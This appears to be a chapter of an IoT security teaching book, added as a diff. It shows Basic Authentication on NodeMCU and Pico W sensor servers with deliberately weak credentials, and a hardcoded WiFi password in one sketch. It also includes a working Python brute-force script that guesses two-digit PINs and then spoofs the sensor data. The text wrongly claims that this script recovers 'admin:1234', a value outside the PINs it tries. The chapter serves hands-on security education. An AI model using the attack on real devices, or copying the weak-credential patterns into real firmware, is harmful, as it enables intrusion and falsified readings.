@@ -1,0 +1,478 @@
+% ==========================================
+% CHAPTER 05: Level 7 (Basic Auth)
+% ==========================================
+\chapter{Level 7: HTTP Basic Authentication}
+
+\textbf{In This Chapter:}
+\begin{itemize}
+    \item Deploying the `Authorization: Basic` HTTP Header.
+    \item Base64 encoding mathematics explicitly revealed.
+    \item Executing NodeMCU Level 7 and Pico W `04\_weak\_login`.
+    \item Deploying the catastrophic Python Dictionary Brute-Force (`04\_attack.py`).
+\end{itemize}
+
+To immediately patch the vulnerability demonstrated in Level 6, we seal the endpoint using HTTP Basic Authentication (Defined globally in RFC 7617: \url{https://datatracker.ietf.org/doc/html/rfc7617}). 
+
+\section{The Mechanics of Basic Auth}
+When a user navigates to a secured endpoint, the server rejects them using status code `401 Unauthorized`. It also transmits the header `WWW-Authenticate: Basic`. The browser intercepts this header, halts the HTML engine, and generates a native login popup window.
+
+When the user clicks "Submit", the browser merges the username and password, separated by a colon (e.g., `admin:1234`). It then runs this string through a \textbf{Base64 Encoding Algorithm}. 
+
+Base64 is a binary-to-text encoding scheme. It translates the string into a globally printable ASCII format. `admin:1234` mathematically converts to `YWRtaW46MTIzNA==`. The browser transmits this string back to the server:
+\texttt{Authorization: Basic YWRtaW46MTIzNA==}
+
+\begin{troubleshootbox}[Base64 is NOT Encryption!]
+Base64 utilizes NO cryptographic keys! It is merely a translation alphabet. Any attacker sniffing the Wi-Fi packet can capture `YWRtaW46MTIzNA==` and reverse it back into `admin:1234` instantly. Never use Basic Auth exclusively over non-TLS (HTTP) networks for safety-critical architecture.
+\end{troubleshootbox}
+
+% -------------------------
+% NodeMCU
+% -------------------------
+\section{Systematic NodeMCU Implementation (Level 7)}
+The Arduino C++ ecosystem makes this incredibly streamlined. We restrict the override capability utilizing `server.authenticate()`. Unabridged code below:
+
+\begin{lstlisting}[language=C++, caption=23022026\_Level\_7\_IoT\_Secure\_Override\_Demo.ino]
+/*
+  IoT Security Demo – Password Protected Override
+  ------------------------------------------------
+  Board: NodeMCU (ESP8266)
+  Sensor: DHT22
+
+  PURPOSE:
+  1. Show real temperature & humidity by default.
+  2. Allow override using URL parameters (?t= & ?h=).
+  3. Require username & password before allowing override.
+  4. Fake values remain until reboot.
+
+  HOW TO TEST:
+
+  Normal:
+    http://YOUR_IP
+
+  Override (Browser):
+    http://YOUR_IP/?t=100&h=5
+    → Browser will ask Username & Password
+
+  Override (CMD):
+    curl -u admin:1234 "http://YOUR_IP/?t=80&h=10"
+
+  NOTE:
+  This uses Basic Authentication over HTTP.
+  Password is NOT encrypted (educational demo only).
+*/
+
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+#include <DHT.h>
+
+#define D5PIN D5
+#define DHTTYPE DHT22
+
+// ---------------- WIFI CONFIG ----------------
+const char* ssid = "drarka.in";            // Your WiFi Name
+const char* pass = "arkaprabha@1985";      // Your WiFi Password
+
+// ---------------- ADMIN LOGIN ----------------
+const char* adminUser = "admin";           // Username for override
+const char* adminPass = "1234";            // Password for override
+
+// ---------------- OBJECTS ----------------
+DHT dht(D5PIN, DHTTYPE);
+ESP8266WebServer server(80);
+
+// ---------------- OVERRIDE STORAGE ----------------
+float overrideTemp = NAN;
+float overrideHum  = NAN;
+
+void setup() {
+
+  Serial.begin(9600);       // Start Serial Monitor
+  dht.begin();              // Start DHT sensor
+
+  WiFi.begin(ssid, pass);   // Connect to WiFi
+  while (WiFi.status() != WL_CONNECTED) {
+    delay(500);
+  }
+
+  Serial.println("Connected!");
+  Serial.print("Open this IP in browser: ");
+  Serial.println(WiFi.localIP());
+
+  // ---------------- WEB SERVER ----------------
+  server.on("/", []() {
+
+    // Step 1: If user tries to override values...
+    if (server.hasArg("t") || server.hasArg("h")) {
+
+      // Step 2: Ask for authentication against the memory variables
+      if (!server.authenticate(adminUser, adminPass)) {
+        return server.requestAuthentication(); // Throws 401 Header
+      }
+
+      // Step 3: If login successful → store override safely
+      if (server.hasArg("t")) overrideTemp = server.arg("t").toFloat();
+      if (server.hasArg("h")) overrideHum  = server.arg("h").toFloat();
+
+      Serial.println("Override authorized!");
+    }
+
+    // Read real sensor values
+    float t = dht.readTemperature();
+    float h = dht.readHumidity();
+
+    // Replace with override if exists
+    if (!isnan(overrideTemp)) t = overrideTemp;
+    if (!isnan(overrideHum))  h = overrideHum;
+
+    // -------- HTML PAGE --------
+    String page = "<html>";
+    page += "<head><meta http-equiv='refresh' content='5'></head>";
+    page += "<body bgcolor='black' text='white'><center>";
+
+    page += "<h1>Temperature</h1>";
+    page += "<h1><font color='cyan'>" + String(t) + " C</font></h1>";
+
+    page += "<h1>Humidity</h1>";
+    page += "<h1><font color='pink'>" + String(h) + " %</font></h1>";
+
+    page += "</center></body></html>";
+
+    server.send(200, "text/html", page);
+  });
+
+  server.begin();  // Start server
+}
+
+void loop() {
+  server.handleClient();  // Keep server running
+}
+\end{lstlisting}
+
+% -------------------------
+% Pico W 04
+% -------------------------
+\section{Systematic Pico W Implementation (04\_Weak\_Login)}
+In MicroPython, lacking the high-level web server class libraries, we pre-calculate the Base64 value manually using the \texttt{ubinascii} library, and parse the socket strings looking for a literal substring match.
+
+\begin{lstlisting}[language=Python, caption=04\_weak\_login.py]
+import network
+import socket
+import time
+import machine
+import dht
+import ubinascii
+import secrets
+
+# -------------------------
+# Sensor Setup
+# -------------------------
+sensor = dht.DHT22(machine.Pin(15))
+
+# -------------------------
+# WiFi Connection
+# -------------------------
+wlan = network.WLAN(network.STA_IF)
+wlan.active(True)
+wlan.connect(secrets.SSID, secrets.PASSWORD)
+
+print("Connecting to WiFi...")
+while not wlan.isconnected():
+    time.sleep(1)
+
+ip = wlan.ifconfig()[0]
+print("Connected! IP:", ip)
+
+# -------------------------
+# Authentication Setup
+# -------------------------
+# Step 1: Base64 Translation Execution
+auth = ubinascii.b2a_base64(
+    f"{secrets.WEB_USER}:{secrets.WEB_PASS}".encode()
+).strip().decode()
+
+expected = f"Basic {auth}"
+
+# -------------------------
+# Socket Setup
+# -------------------------
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(('0.0.0.0', 80))
+s.listen(5)
+s.settimeout(1.0)   # Prevents freezing
+
+# -------------------------
+# Variables
+# -------------------------
+t, h = "0.0", "0.0"
+spoof_active = False
+
+print("Server running...")
+
+# -------------------------
+# Main Loop
+# -------------------------
+try:
+    while True:
+
+        # Update real sensor data
+        if not spoof_active:
+            try:
+                sensor.measure()
+                t = "{:.1f}".format(sensor.temperature())
+                h = "{:.1f}".format(sensor.humidity())
+            except:
+                pass
+
+        conn = None
+
+        try:
+            conn, addr = s.accept()
+            conn.settimeout(1.0)
+
+            raw_req = conn.recv(1024)
+            if not raw_req:
+                conn.close()
+                continue
+
+            req = raw_req.decode()
+
+            # -------------------------
+            # AUTH CHECK
+            # -------------------------
+            # Step 2: Does the browser string contain our exact Base64 match?
+            if expected in req:
+
+                # Spoof Sensor
+                if '/set_env?' in req:
+                    try:
+                        query = req.split('?')[1].split(' ')[0]
+                        parts = query.split('&')
+                        for p in parts:
+                            if p.startswith('t='):
+                                t = p.split('=')[1]
+                            if p.startswith('h='):
+                                h = p.split('=')[1]
+                        spoof_active = True
+                    except:
+                        pass
+
+                # Reset
+                if '/reset' in req:
+                    spoof_active = False
+
+                # -------------------------
+                # HTML UI
+                # -------------------------
+                html = f"""<!DOCTYPE html>
+<html>
+<head>
+<title>Pico Secure Monitor</title>
+<meta http-equiv="refresh" content="2">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {{
+    background-color: #121212;
+    font-family: sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}}
+.card {{
+    background-color: #1e1e1e;
+    padding: 2rem;
+    border-radius: 1rem;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+    text-align: center;
+    width: 320px;
+}}
+.temp {{
+    color: cyan;
+    font-size: 2.5rem;
+    font-weight: bold;
+}}
+.hum {{
+    color: pink;
+    font-size: 2.5rem;
+    font-weight: bold;
+}}
+.label {{
+    color: #888;
+    font-size: 0.8rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}}
+.status {{
+    margin-top: 1rem;
+    color: orange;
+    font-size: 0.9rem;
+}}
+button {{
+    margin-top: 1rem;
+    padding: 8px 15px;
+    border: none;
+    border-radius: 6px;
+    background: #333;
+    color: white;
+}}
+</style>
+</head>
+<body>
+<div class="card">
+    <div class="label">Temperature</div>
+    <div class="temp">{t} &deg;C</div>
+    <div class="label">Humidity</div>
+    <div class="hum">{h} %</div>
+
+    <div class="status">
+        {"SPOOF MODE ACTIVE" if spoof_active else "LIVE SENSOR DATA"}
+    </div>
+
+    <a href="/reset"><button>Reset</button></a>
+</div>
+</body>
+</html>"""
+
+                conn.send('HTTP/1.0 200 OK\r\nContent-type: text/html\r\n\r\n')
+                conn.sendall(html)
+
+            else:
+                # Step 3: Hard Socket Rejection logic
+                conn.send('HTTP/1.0 401 Unauthorized\r\n')
+                conn.send('WWW-Authenticate: Basic realm="Restricted"\r\n\r\n')
+                conn.send('<h1>401 Unauthorized</h1>')
+
+            conn.close()
+
+        except OSError:
+            time.sleep(0.1)
+
+        except Exception:
+            if conn:
+                conn.close()
+
+        time.sleep(0.1)
+
+except KeyboardInterrupt:
+    print("Server Stopped")
+    s.close()
+\end{lstlisting}
+
+% -------------------------
+% ATTACK SCRIPT
+% -------------------------
+\section{The Brute-Force Exploit (Python Dictionary Protocol)}
+
+Congratulations. The Python Hack script from Chapter 4 reliably crashes violently against the `401 Unauthorized` wall. However, our device is still functionally compromised. By utilizing a "Weak" PIN code mechanism, an attacker upgrades their logic from blind opportunism to targeted \textbf{Dictionary Aggregation}.
+
+By running the `04\_attack.py` script on the attacking laptop, the script sequentially builds native Base64 payloads (e.g., `test\_auth`) and slams them repeatedly against the Pico's port 80. Note the specific inclusion of `time.sleep(1)` inside the attack script: this is not an artificial delay to be nice. If the attacker hurled strings too fast, the Pico's weak processor halts under a Denial-of-Service freeze, making the attack fail! A skilled attacker paces their attack precisely to match the hardware execution speed of their victim.
+
+\begin{lstlisting}[language=Python, caption=04\_attack.py]
+import urllib.request
+import urllib.error
+import sys
+import time
+import base64
+
+# --- Configuration ---
+print("--- PICO ULTIMATE EXPLOIT TOOL ---")
+target_ip = input("Enter Pico IP (e.g., 192.168.1.50): ")
+username = input("Enter Username to target: ")
+
+def test_auth(ip, user, pwd):
+    """Tests a single password and returns the auth_str if successful."""
+    creds = f"{user}:{pwd}"
+    auth_str = base64.b64encode(creds.encode()).decode()
+    headers = {
+        "Authorization": f"Basic {auth_str}",
+        "Connection": "close"  # Crucial for Pico stability
+    }
+    url = f"http://{ip}/"
+    
+    try:
+        req = urllib.request.Request(url, headers=headers)
+        with urllib.request.urlopen(req, timeout=3) as response:
+            if response.status == 200:
+                return auth_str
+    except urllib.error.HTTPError as e:
+        if e.code == 401:
+            return None # Wrong password
+    except Exception:
+        return "RETRY" # Pico is likely busy or timed out
+    return None
+
+# --- Phase 1: Authentication ---
+found_auth = None
+mode = input("Do you know the password? (y/n): ").lower()
+
+if mode == 'y':
+    pwd = input("Enter known password: ")
+    print("[*] Verifying...")
+    found_auth = test_auth(target_ip, username, pwd)
+    if not found_auth:
+        print("[-] Incorrect. Switching to Brute Force...")
+        mode = 'n'
+
+if mode == 'n':
+    print(f"[*] Starting Brute Force (00-99) for '{username}'...")
+    for i in range(100):
+        # Format string integer injection
+        pwd = f"{i:02d}"  # Formats as 00, 01, 02...
+        sys.stdout.write(f"\r[*] Testing PIN: {pwd} ")
+        sys.stdout.flush()
+        
+        result = test_auth(target_ip, username, pwd)
+        
+        if result == "RETRY":
+            # Pico is overwhelmed, wait a second and try the same number again
+            time.sleep(1)
+            result = test_auth(target_ip, username, pwd)
+
+        if result and result != "RETRY":
+            print(f"\n[+] SUCCESS! Password found: {pwd}")
+            found_auth = result
+            break
+        
+        # Small delay to prevent the Pico's network stack from crashing
+        time.sleep(0.1)
+
+# --- Phase 2: Exploit Menu ---
+if found_auth:
+    headers = {"Authorization": f"Basic {found_auth}", "Connection": "close"}
+    while True:
+        print("\n" + "="*20)
+        print(" ACCESS GRANTED ")
+        print("="*20)
+        print("1. SPOOF DATA (T=99.9, H=99.9)")
+        print("2. CUSTOM OVERRIDE")
+        print("3. RESET SYSTEM")
+        print("4. EXIT")
+        
+        choice = input("\nSelect Option: ")
+        
+        path = ""
+        if choice == "1":
+            path = "/set_env?t=99.9&h=99.9"
+        elif choice == "2":
+            t = input("Enter Temp: ")
+            h = input("Enter Humid: ")
+            path = f"/set_env?t={t}&h={h}"
+        elif choice == "3":
+            path = "/reset"
+        elif choice == "4":
+            break
+        
+        if path:
+            try:
+                req = urllib.request.Request(f"http://{target_ip}{path}", headers=headers)
+                urllib.request.urlopen(req, timeout=3)
+                print("[+] Command sent successfully!")
+            except Exception as e:
+                print(f"[!] Command failed: {e}")
+else:
+    print("\n[-] Attack finished. No access gained.")
+\end{lstlisting}
+
+This algorithm completely obliterates the Level 7 NodeMCU and the 04 Pico defenses. In less than ten seconds, the device will yield to `admin:1234` or whatever weak numerical boundary the user has established. We must proceed to Lockouts.
